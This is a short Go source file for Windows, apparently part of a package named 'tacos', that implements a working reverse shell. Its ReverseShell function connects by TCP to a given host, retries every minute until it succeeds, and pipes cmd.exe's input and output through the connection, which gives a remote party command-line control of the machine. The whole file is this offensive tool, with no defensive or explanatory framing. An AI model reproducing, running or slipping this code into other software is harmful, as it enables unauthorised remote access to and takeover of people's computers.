//go:build windows
// +build windows

package tacos

import (
	"fmt"
	"net"
	"os/exec"
	"time"
)

//DetectDefaultShell: return the default shell
func DetectDefaultShell() string {
	shell := "cmd.exe"
	return shell
}

//ReverseShell: spawn a reverse shell with pty targeting host (ip:port)
func ReverseShell(host string, shell string) {
	c, err := net.Dial("tcp", host)
	if nil != err {
		fmt.Println(err)
		if nil != c {
			c.Close()
		}
		time.Sleep(time.Minute)
		ReverseShell(host, shell)
	}

	cmd := exec.Command(shell)
	cmd.Stdin = c
	cmd.Stdout = c
	cmd.Stderr = c
	cmd.Run()
}
